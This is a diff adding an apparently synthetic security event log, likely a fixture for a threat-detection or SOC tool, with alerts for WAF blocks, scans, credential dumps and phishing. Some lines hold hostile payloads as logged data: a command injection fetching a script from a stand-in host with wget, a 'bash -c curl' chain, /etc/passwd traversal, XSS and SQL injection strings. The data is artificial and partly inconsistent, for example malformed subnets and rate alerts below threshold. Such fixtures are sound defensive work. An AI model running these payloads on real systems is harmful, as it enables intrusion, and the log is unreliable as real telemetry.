@@ -1,0 +1,840 @@
+2026-04-01T00:00:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.10 current_rate=20/s threshold=200/s
+2026-04-01T00:12:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0001.bin size=21
+2026-04-01T00:24:00 NOTICE backup: incremental snapshot completed server=soc-sql-0002 duration_s=22
+2026-04-01T00:36:00 WARNING web-gw: suspicious request src=203.0.113.13 path=/app/search?q=1=1 blocked=soft
+2026-04-01T00:48:00 EMERGENCY soc: Failed password for root from 203.0.113.14; nmap masscan SYN.flood; union select drop table users; <script>alert(1)</script>; ../etc/passwd; id; wget http://bad.example/p.sh; mimikatz lsass hashdump ntlm; ransomware C2 command.and.control token=t-0004
+2026-04-01T01:00:00 WARNING email-scanner: phishing_keywords matched="verify your account" sender=notice-0005@example-mail.net
+2026-04-01T01:12:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.16
+2026-04-01T01:24:00 INFO mailgw: message_id=<M-0007@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-01T01:36:00 INFO auth: successful login for analyst from 203.0.113.18 mfa=pass session=s-0008
+2026-04-01T01:48:00 INFO auth: successful login for analyst from 203.0.113.19 mfa=pass session=s-0009
+2026-04-01T02:00:00 INFO auth: successful login for analyst from 203.0.113.20 mfa=pass session=s-0010
+2026-04-01T02:12:00 INFO dashboard: /api/summary request served src=203.0.113.21 response_ms=31
+2026-04-01T02:24:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.22 against 10.20.0012.0/24
+2026-04-01T02:36:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0013.bin size=33
+2026-04-01T02:48:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.24 against 10.20.0014.0/24
+2026-04-01T03:00:00 WARNING sshd: Failed password for admin from 203.0.113.25 port 35 ssh2
+2026-04-01T03:12:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=36
+2026-04-01T03:24:00 ALERT integrity: verify_event status=false reason=signature_mismatch event_id=evt-0017
+2026-04-01T03:36:00 INFO dashboard: /api/summary request served src=203.0.113.28 response_ms=38
+2026-04-01T03:48:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=39
+2026-04-01T04:00:00 WARNING web-gw: suspicious request src=203.0.113.30 path=/app/search?q=1=1 blocked=soft
+2026-04-01T04:12:00 ALERT integrity: verify_event status=false reason=signature_mismatch event_id=evt-0021
+2026-04-01T04:24:00 WARNING endpoint: malware indicator ransomware C2 beacon observed host=ws-0022 src=203.0.113.32
+2026-04-01T04:36:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.33 against 10.20.0023.0/24
+2026-04-01T04:48:00 INFO auth: successful login for analyst from 203.0.113.34 mfa=pass session=s-0024
+2026-04-01T05:00:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.35 current_rate=45/s threshold=200/s
+2026-04-01T05:12:00 INFO mailgw: message_id=<M-0026@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-01T05:24:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.37 against 10.20.0027.0/24
+2026-04-01T05:36:00 CRITICAL ir: credential dump detected via mimikatz on host=dc-0028 source=203.0.113.38 pass-the-hash attempt=true
+2026-04-01T05:48:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=49
+2026-04-01T06:00:00 WARNING email-scanner: phishing_keywords matched="verify your account" sender=notice-0030@example-mail.net
+2026-04-01T06:12:00 INFO mailgw: message_id=<M-0031@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-01T06:24:00 NOTICE backup: incremental snapshot completed server=soc-sql-0032 duration_s=52
+2026-04-01T06:36:00 WARNING endpoint: malware indicator ransomware C2 beacon observed host=ws-0033 src=203.0.113.43
+2026-04-01T06:48:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=54
+2026-04-01T07:00:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0035.bin size=55
+2026-04-01T07:12:00 CRITICAL ir: credential dump detected via mimikatz on host=dc-0036 source=203.0.113.46 pass-the-hash attempt=true
+2026-04-01T07:24:00 CRITICAL waf: command injection blocked payload="id; wget http://bad.example/p.sh" src=203.0.113.47
+2026-04-01T07:36:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.48
+2026-04-01T07:48:00 INFO mailgw: message_id=<M-0039@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-01T08:00:00 NOTICE backup: incremental snapshot completed server=soc-sql-0040 duration_s=60
+2026-04-01T08:12:00 INFO dashboard: /api/summary request served src=203.0.113.51 response_ms=61
+2026-04-01T08:24:00 ALERT integrity: verify_event status=false reason=signature_mismatch event_id=evt-0042
+2026-04-01T08:36:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0043.bin size=63
+2026-04-01T08:48:00 INFO auth: successful login for analyst from 203.0.113.54 mfa=pass session=s-0044
+2026-04-01T09:00:00 INFO app: routine health check passed host=node-0045 latency_ms=65 status=ok
+2026-04-01T09:12:00 INFO dashboard: /api/summary request served src=203.0.113.56 response_ms=66
+2026-04-01T09:24:00 INFO mailgw: message_id=<M-0047@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-01T09:36:00 WARNING sshd: Failed password for admin from 203.0.113.58 port 68 ssh2
+2026-04-01T09:48:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.59
+2026-04-01T10:00:00 WARNING sshd: Failed password for admin from 203.0.113.60 port 70 ssh2
+2026-04-01T10:12:00 INFO mailgw: message_id=<M-0051@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-01T10:24:00 INFO mailgw: message_id=<M-0052@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-01T10:36:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0053.bin size=73
+2026-04-01T10:48:00 WARNING email-scanner: phishing_keywords matched="verify your account" sender=notice-0054@example-mail.net
+2026-04-01T11:00:00 WARNING web-gw: suspicious request src=203.0.113.65 path=/app/search?q=1=1 blocked=soft
+2026-04-01T11:12:00 NOTICE backup: incremental snapshot completed server=soc-sql-0056 duration_s=76
+2026-04-01T11:24:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.67
+2026-04-01T11:36:00 ALERT integrity: verify_event status=false reason=signature_mismatch event_id=evt-0058
+2026-04-01T11:48:00 INFO app: routine health check passed host=node-0059 latency_ms=79 status=ok
+2026-04-01T12:00:00 NOTICE backup: incremental snapshot completed server=soc-sql-0060 duration_s=80
+2026-04-01T12:12:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=81
+2026-04-01T12:24:00 INFO dashboard: /api/summary request served src=203.0.113.72 response_ms=82
+2026-04-01T12:36:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.73
+2026-04-01T12:48:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.74
+2026-04-01T13:00:00 NOTICE backup: incremental snapshot completed server=soc-sql-0065 duration_s=85
+2026-04-01T13:12:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=86
+2026-04-01T13:24:00 INFO dashboard: /api/summary request served src=203.0.113.77 response_ms=87
+2026-04-01T13:36:00 INFO auth: successful login for analyst from 203.0.113.78 mfa=pass session=s-0068
+2026-04-01T13:48:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0069.bin size=89
+2026-04-01T14:00:00 INFO app: routine health check passed host=node-0070 latency_ms=90 status=ok
+2026-04-01T14:12:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.81
+2026-04-01T14:24:00 INFO mailgw: message_id=<M-0072@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-01T14:36:00 INFO app: routine health check passed host=node-0073 latency_ms=93 status=ok
+2026-04-01T14:48:00 WARNING endpoint: malware indicator ransomware C2 beacon observed host=ws-0074 src=203.0.113.84
+2026-04-01T15:00:00 INFO dashboard: /api/summary request served src=203.0.113.85 response_ms=95
+2026-04-01T15:12:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.86
+2026-04-01T15:24:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0077.bin size=97
+2026-04-01T15:36:00 HIGH soc: DDoS amplification flood detected src=203.0.113.88 pps=98
+2026-04-01T15:48:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=99
+2026-04-01T16:00:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=100
+2026-04-01T16:12:00 CRITICAL ir: credential dump detected via mimikatz on host=dc-0081 source=203.0.113.91 pass-the-hash attempt=true
+2026-04-01T16:24:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=102
+2026-04-01T16:36:00 INFO mailgw: message_id=<M-0083@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-01T16:48:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.94
+2026-04-01T17:00:00 NOTICE backup: incremental snapshot completed server=soc-sql-0085 duration_s=105
+2026-04-01T17:12:00 INFO dashboard: /api/summary request served src=203.0.113.96 response_ms=106
+2026-04-01T17:24:00 CRITICAL network: ddos reflection flood and malware rootkit keylogger activity correlated attacker=203.0.113.97 campaign=camp-0087
+2026-04-01T17:36:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.98 current_rate=108/s threshold=200/s
+2026-04-01T17:48:00 INFO dashboard: /api/summary request served src=203.0.113.99 response_ms=109
+2026-04-01T18:00:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.100
+2026-04-01T18:12:00 ALERT waf: XSS attempt blocked pattern=<script>alert("x")</script> src=203.0.113.101
+2026-04-01T18:24:00 WARNING email-scanner: phishing_keywords matched="verify your account" sender=notice-0092@example-mail.net
+2026-04-01T18:36:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.103 current_rate=113/s threshold=200/s
+2026-04-01T18:48:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0094.bin size=114
+2026-04-01T19:00:00 CRITICAL network: ddos reflection flood and malware rootkit keylogger activity correlated attacker=203.0.113.105 campaign=camp-0095
+2026-04-01T19:12:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0096.bin size=116
+2026-04-01T19:24:00 INFO dashboard: /api/summary request served src=203.0.113.107 response_ms=117
+2026-04-01T19:36:00 WARNING email-scanner: phishing_keywords matched="verify your account" sender=notice-0098@example-mail.net
+2026-04-01T19:48:00 EMERGENCY waf: SQL injection and command injection chain src=203.0.113.109 payload="union select ...; bash -c curl bad.example"
+2026-04-01T20:00:00 INFO auth: successful login for analyst from 203.0.113.110 mfa=pass session=s-0100
+2026-04-01T20:12:00 INFO mailgw: message_id=<M-0101@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-01T20:24:00 INFO mailgw: message_id=<M-0102@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-01T20:36:00 INFO mailgw: message_id=<M-0103@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-01T20:48:00 NOTICE backup: incremental snapshot completed server=soc-sql-0104 duration_s=124
+2026-04-01T21:00:00 INFO mailgw: message_id=<M-0105@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-01T21:12:00 INFO dashboard: /api/summary request served src=203.0.113.116 response_ms=126
+2026-04-01T21:24:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.117
+2026-04-01T21:36:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.118 against 10.20.0108.0/24
+2026-04-01T21:48:00 WARNING web-gw: suspicious request src=203.0.113.119 path=/app/search?q=1=1 blocked=soft
+2026-04-01T22:00:00 WARNING endpoint: malware indicator ransomware C2 beacon observed host=ws-0110 src=203.0.113.120
+2026-04-01T22:12:00 INFO dashboard: /api/summary request served src=203.0.113.121 response_ms=131
+2026-04-01T22:24:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=132
+2026-04-01T22:36:00 NOTICE backup: incremental snapshot completed server=soc-sql-0113 duration_s=133
+2026-04-01T22:48:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0114.bin size=134
+2026-04-01T23:00:00 INFO mailgw: message_id=<M-0115@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-01T23:12:00 INFO auth: successful login for analyst from 203.0.113.126 mfa=pass session=s-0116
+2026-04-01T23:24:00 ALERT waf: XSS attempt blocked pattern=<script>alert("x")</script> src=203.0.113.127
+2026-04-01T23:36:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0118.bin size=138
+2026-04-01T23:48:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.129 against 10.20.0119.0/24
+2026-04-02T00:00:00 INFO dashboard: /api/summary request served src=203.0.113.130 response_ms=140
+2026-04-02T00:12:00 INFO app: routine health check passed host=node-0121 latency_ms=141 status=ok
+2026-04-02T00:24:00 INFO auth: successful login for analyst from 203.0.113.132 mfa=pass session=s-0122
+2026-04-02T00:36:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.133
+2026-04-02T00:48:00 INFO app: routine health check passed host=node-0124 latency_ms=144 status=ok
+2026-04-02T01:00:00 ALERT integrity: verify_event status=false reason=signature_mismatch event_id=evt-0125
+2026-04-02T01:12:00 INFO mailgw: message_id=<M-0126@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-02T01:24:00 NOTICE backup: incremental snapshot completed server=soc-sql-0127 duration_s=147
+2026-04-02T01:36:00 INFO app: routine health check passed host=node-0128 latency_ms=148 status=ok
+2026-04-02T01:48:00 WARNING sshd: Failed password for admin from 203.0.113.139 port 149 ssh2
+2026-04-02T02:00:00 CRITICAL waf: command injection blocked payload="id; wget http://bad.example/p.sh" src=203.0.113.140
+2026-04-02T02:12:00 INFO app: routine health check passed host=node-0131 latency_ms=151 status=ok
+2026-04-02T02:24:00 ALERT integrity: verify_event status=false reason=signature_mismatch event_id=evt-0132
+2026-04-02T02:36:00 CRITICAL network: ddos reflection flood and malware rootkit keylogger activity correlated attacker=203.0.113.143 campaign=camp-0133
+2026-04-02T02:48:00 EMERGENCY soc: Failed password for root from 203.0.113.144; nmap masscan SYN.flood; union select drop table users; <script>alert(1)</script>; ../etc/passwd; id; wget http://bad.example/p.sh; mimikatz lsass hashdump ntlm; ransomware C2 command.and.control token=t-0134
+2026-04-02T03:00:00 INFO auth: successful login for analyst from 203.0.113.145 mfa=pass session=s-0135
+2026-04-02T03:12:00 WARNING sshd: Failed password for admin from 203.0.113.146 port 156 ssh2
+2026-04-02T03:24:00 INFO dashboard: /api/summary request served src=203.0.113.147 response_ms=157
+2026-04-02T03:36:00 INFO dashboard: /api/summary request served src=203.0.113.148 response_ms=158
+2026-04-02T03:48:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0139.bin size=159
+2026-04-02T04:00:00 WARNING sshd: Failed password for admin from 203.0.113.150 port 160 ssh2
+2026-04-02T04:12:00 INFO auth: successful login for analyst from 203.0.113.151 mfa=pass session=s-0141
+2026-04-02T04:24:00 INFO auth: successful login for analyst from 203.0.113.152 mfa=pass session=s-0142
+2026-04-02T04:36:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.153
+2026-04-02T04:48:00 NOTICE backup: incremental snapshot completed server=soc-sql-0144 duration_s=164
+2026-04-02T05:00:00 INFO auth: successful login for analyst from 203.0.113.155 mfa=pass session=s-0145
+2026-04-02T05:12:00 INFO mailgw: message_id=<M-0146@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-02T05:24:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.157 current_rate=167/s threshold=200/s
+2026-04-02T05:36:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=168
+2026-04-02T05:48:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=169
+2026-04-02T06:00:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.160
+2026-04-02T06:12:00 INFO auth: successful login for analyst from 203.0.113.161 mfa=pass session=s-0151
+2026-04-02T06:24:00 INFO dashboard: /api/summary request served src=203.0.113.162 response_ms=172
+2026-04-02T06:36:00 WARNING endpoint: malware indicator ransomware C2 beacon observed host=ws-0153 src=203.0.113.163
+2026-04-02T06:48:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.164 current_rate=174/s threshold=200/s
+2026-04-02T07:00:00 INFO app: routine health check passed host=node-0155 latency_ms=175 status=ok
+2026-04-02T07:12:00 CRITICAL network: ddos reflection flood and malware rootkit keylogger activity correlated attacker=203.0.113.166 campaign=camp-0156
+2026-04-02T07:24:00 ALERT waf: XSS attempt blocked pattern=<script>alert("x")</script> src=203.0.113.167
+2026-04-02T07:36:00 NOTICE backup: incremental snapshot completed server=soc-sql-0158 duration_s=178
+2026-04-02T07:48:00 NOTICE backup: incremental snapshot completed server=soc-sql-0159 duration_s=179
+2026-04-02T08:00:00 WARNING web-gw: suspicious request src=203.0.113.170 path=/app/search?q=1=1 blocked=soft
+2026-04-02T08:12:00 INFO mailgw: message_id=<M-0161@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-02T08:24:00 INFO mailgw: message_id=<M-0162@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-02T08:36:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=183
+2026-04-02T08:48:00 EMERGENCY soc: Failed password for root from 203.0.113.174; nmap masscan SYN.flood; union select drop table users; <script>alert(1)</script>; ../etc/passwd; id; wget http://bad.example/p.sh; mimikatz lsass hashdump ntlm; ransomware C2 command.and.control token=t-0164
+2026-04-02T09:00:00 NOTICE backup: incremental snapshot completed server=soc-sql-0165 duration_s=185
+2026-04-02T09:12:00 INFO app: routine health check passed host=node-0166 latency_ms=186 status=ok
+2026-04-02T09:24:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.177 current_rate=187/s threshold=200/s
+2026-04-02T09:36:00 NOTICE backup: incremental snapshot completed server=soc-sql-0168 duration_s=188
+2026-04-02T09:48:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0169.bin size=189
+2026-04-02T10:00:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.180 against 10.20.0170.0/24
+2026-04-02T10:12:00 INFO app: routine health check passed host=node-0171 latency_ms=191 status=ok
+2026-04-02T10:24:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=192
+2026-04-02T10:36:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=193
+2026-04-02T10:48:00 CRITICAL ir: credential dump detected via mimikatz on host=dc-0174 source=203.0.113.184 pass-the-hash attempt=true
+2026-04-02T11:00:00 CRITICAL network: ddos reflection flood and malware rootkit keylogger activity correlated attacker=203.0.113.185 campaign=camp-0175
+2026-04-02T11:12:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=196
+2026-04-02T11:24:00 NOTICE backup: incremental snapshot completed server=soc-sql-0177 duration_s=197
+2026-04-02T11:36:00 ALERT waf: XSS attempt blocked pattern=<script>alert("x")</script> src=203.0.113.188
+2026-04-02T11:48:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=199
+2026-04-02T12:00:00 WARNING email-scanner: phishing_keywords matched="verify your account" sender=notice-0180@example-mail.net
+2026-04-02T12:12:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0181.bin size=201
+2026-04-02T12:24:00 CRITICAL waf: command injection blocked payload="id; wget http://bad.example/p.sh" src=203.0.113.192
+2026-04-02T12:36:00 NOTICE backup: incremental snapshot completed server=soc-sql-0183 duration_s=203
+2026-04-02T12:48:00 INFO dashboard: /api/summary request served src=203.0.113.194 response_ms=204
+2026-04-02T13:00:00 INFO auth: successful login for analyst from 203.0.113.195 mfa=pass session=s-0185
+2026-04-02T13:12:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.196 against 10.20.0186.0/24
+2026-04-02T13:24:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=207
+2026-04-02T13:36:00 HIGH soc: DDoS amplification flood detected src=203.0.113.198 pps=208
+2026-04-02T13:48:00 WARNING sshd: Failed password for admin from 203.0.113.199 port 209 ssh2
+2026-04-02T14:00:00 WARNING web-gw: suspicious request src=203.0.113.200 path=/app/search?q=1=1 blocked=soft
+2026-04-02T14:12:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.201 against 10.20.0191.0/24
+2026-04-02T14:24:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.202
+2026-04-02T14:36:00 NOTICE backup: incremental snapshot completed server=soc-sql-0193 duration_s=213
+2026-04-02T14:48:00 NOTICE backup: incremental snapshot completed server=soc-sql-0194 duration_s=214
+2026-04-02T15:00:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=215
+2026-04-02T15:12:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.206 current_rate=216/s threshold=200/s
+2026-04-02T15:24:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=217
+2026-04-02T15:36:00 NOTICE backup: incremental snapshot completed server=soc-sql-0198 duration_s=218
+2026-04-02T15:48:00 INFO dashboard: /api/summary request served src=203.0.113.209 response_ms=219
+2026-04-02T16:00:00 ALERT integrity: verify_event status=false reason=signature_mismatch event_id=evt-0200
+2026-04-02T16:12:00 INFO app: routine health check passed host=node-0201 latency_ms=221 status=ok
+2026-04-02T16:24:00 NOTICE backup: incremental snapshot completed server=soc-sql-0202 duration_s=222
+2026-04-02T16:36:00 INFO auth: successful login for analyst from 203.0.113.13 mfa=pass session=s-0203
+2026-04-02T16:48:00 WARNING web-gw: suspicious request src=203.0.113.14 path=/app/search?q=1=1 blocked=soft
+2026-04-02T17:00:00 WARNING web-gw: suspicious request src=203.0.113.15 path=/app/search?q=1=1 blocked=soft
+2026-04-02T17:12:00 INFO auth: successful login for analyst from 203.0.113.16 mfa=pass session=s-0206
+2026-04-02T17:24:00 EMERGENCY waf: SQL injection and command injection chain src=203.0.113.17 payload="union select ...; bash -c curl bad.example"
+2026-04-02T17:36:00 HIGH soc: DDoS amplification flood detected src=203.0.113.18 pps=228
+2026-04-02T17:48:00 CRITICAL waf: command injection blocked payload="id; wget http://bad.example/p.sh" src=203.0.113.19
+2026-04-02T18:00:00 WARNING endpoint: malware indicator ransomware C2 beacon observed host=ws-0210 src=203.0.113.20
+2026-04-02T18:12:00 INFO mailgw: message_id=<M-0211@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-02T18:24:00 INFO mailgw: message_id=<M-0212@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-02T18:36:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=233
+2026-04-02T18:48:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.24
+2026-04-02T19:00:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=235
+2026-04-02T19:12:00 HIGH soc: DDoS amplification flood detected src=203.0.113.26 pps=236
+2026-04-02T19:24:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0217.bin size=237
+2026-04-02T19:36:00 NOTICE backup: incremental snapshot completed server=soc-sql-0218 duration_s=238
+2026-04-02T19:48:00 EMERGENCY soc: Failed password for root from 203.0.113.29; nmap masscan SYN.flood; union select drop table users; <script>alert(1)</script>; ../etc/passwd; id; wget http://bad.example/p.sh; mimikatz lsass hashdump ntlm; ransomware C2 command.and.control token=t-0219
+2026-04-02T20:00:00 WARNING endpoint: malware indicator ransomware C2 beacon observed host=ws-0220 src=203.0.113.30
+2026-04-02T20:12:00 ALERT integrity: verify_event status=false reason=signature_mismatch event_id=evt-0221
+2026-04-02T20:24:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.32
+2026-04-02T20:36:00 CRITICAL ir: credential dump detected via mimikatz on host=dc-0223 source=203.0.113.33 pass-the-hash attempt=true
+2026-04-02T20:48:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.34
+2026-04-02T21:00:00 NOTICE backup: incremental snapshot completed server=soc-sql-0225 duration_s=245
+2026-04-02T21:12:00 NOTICE backup: incremental snapshot completed server=soc-sql-0226 duration_s=246
+2026-04-02T21:24:00 HIGH soc: DDoS amplification flood detected src=203.0.113.37 pps=247
+2026-04-02T21:36:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0228.bin size=248
+2026-04-02T21:48:00 INFO dashboard: /api/summary request served src=203.0.113.39 response_ms=249
+2026-04-02T22:00:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=250
+2026-04-02T22:12:00 INFO mailgw: message_id=<M-0231@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-02T22:24:00 CRITICAL waf: command injection blocked payload="id; wget http://bad.example/p.sh" src=203.0.113.42
+2026-04-02T22:36:00 HIGH soc: DDoS amplification flood detected src=203.0.113.43 pps=253
+2026-04-02T22:48:00 ALERT integrity: verify_event status=false reason=signature_mismatch event_id=evt-0234
+2026-04-02T23:00:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=255
+2026-04-02T23:12:00 WARNING web-gw: suspicious request src=203.0.113.46 path=/app/search?q=1=1 blocked=soft
+2026-04-02T23:24:00 WARNING endpoint: malware indicator ransomware C2 beacon observed host=ws-0237 src=203.0.113.47
+2026-04-02T23:36:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.48
+2026-04-02T23:48:00 NOTICE backup: incremental snapshot completed server=soc-sql-0239 duration_s=259
+2026-04-03T00:00:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0240.bin size=260
+2026-04-03T00:12:00 CRITICAL network: ddos reflection flood and malware rootkit keylogger activity correlated attacker=203.0.113.51 campaign=camp-0241
+2026-04-03T00:24:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.52
+2026-04-03T00:36:00 WARNING email-scanner: phishing_keywords matched="verify your account" sender=notice-0243@example-mail.net
+2026-04-03T00:48:00 CRITICAL ir: credential dump detected via mimikatz on host=dc-0244 source=203.0.113.54 pass-the-hash attempt=true
+2026-04-03T01:00:00 ALERT waf: XSS attempt blocked pattern=<script>alert("x")</script> src=203.0.113.55
+2026-04-03T01:12:00 WARNING sshd: Failed password for admin from 203.0.113.56 port 266 ssh2
+2026-04-03T01:24:00 INFO app: routine health check passed host=node-0247 latency_ms=267 status=ok
+2026-04-03T01:36:00 INFO auth: successful login for analyst from 203.0.113.58 mfa=pass session=s-0248
+2026-04-03T01:48:00 INFO auth: successful login for analyst from 203.0.113.59 mfa=pass session=s-0249
+2026-04-03T02:00:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0250.bin size=270
+2026-04-03T02:12:00 EMERGENCY waf: SQL injection and command injection chain src=203.0.113.61 payload="union select ...; bash -c curl bad.example"
+2026-04-03T02:24:00 WARNING sshd: Failed password for admin from 203.0.113.62 port 272 ssh2
+2026-04-03T02:36:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=273
+2026-04-03T02:48:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0254.bin size=274
+2026-04-03T03:00:00 INFO app: routine health check passed host=node-0255 latency_ms=275 status=ok
+2026-04-03T03:12:00 INFO app: routine health check passed host=node-0256 latency_ms=276 status=ok
+2026-04-03T03:24:00 INFO dashboard: /api/summary request served src=203.0.113.67 response_ms=277
+2026-04-03T03:36:00 NOTICE backup: incremental snapshot completed server=soc-sql-0258 duration_s=278
+2026-04-03T03:48:00 WARNING email-scanner: phishing_keywords matched="verify your account" sender=notice-0259@example-mail.net
+2026-04-03T04:00:00 WARNING email-scanner: phishing_keywords matched="verify your account" sender=notice-0260@example-mail.net
+2026-04-03T04:12:00 NOTICE backup: incremental snapshot completed server=soc-sql-0261 duration_s=281
+2026-04-03T04:24:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0262.bin size=282
+2026-04-03T04:36:00 INFO auth: successful login for analyst from 203.0.113.73 mfa=pass session=s-0263
+2026-04-03T04:48:00 CRITICAL ir: credential dump detected via mimikatz on host=dc-0264 source=203.0.113.74 pass-the-hash attempt=true
+2026-04-03T05:00:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.75
+2026-04-03T05:12:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.76
+2026-04-03T05:24:00 EMERGENCY soc: Failed password for root from 203.0.113.77; nmap masscan SYN.flood; union select drop table users; <script>alert(1)</script>; ../etc/passwd; id; wget http://bad.example/p.sh; mimikatz lsass hashdump ntlm; ransomware C2 command.and.control token=t-0267
+2026-04-03T05:36:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.78 against 10.20.0268.0/24
+2026-04-03T05:48:00 INFO auth: successful login for analyst from 203.0.113.79 mfa=pass session=s-0269
+2026-04-03T06:00:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.80 current_rate=290/s threshold=200/s
+2026-04-03T06:12:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.81 current_rate=291/s threshold=200/s
+2026-04-03T06:24:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0272.bin size=292
+2026-04-03T06:36:00 INFO mailgw: message_id=<M-0273@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-03T06:48:00 HIGH soc: DDoS amplification flood detected src=203.0.113.84 pps=294
+2026-04-03T07:00:00 CRITICAL ir: credential dump detected via mimikatz on host=dc-0275 source=203.0.113.85 pass-the-hash attempt=true
+2026-04-03T07:12:00 INFO auth: successful login for analyst from 203.0.113.86 mfa=pass session=s-0276
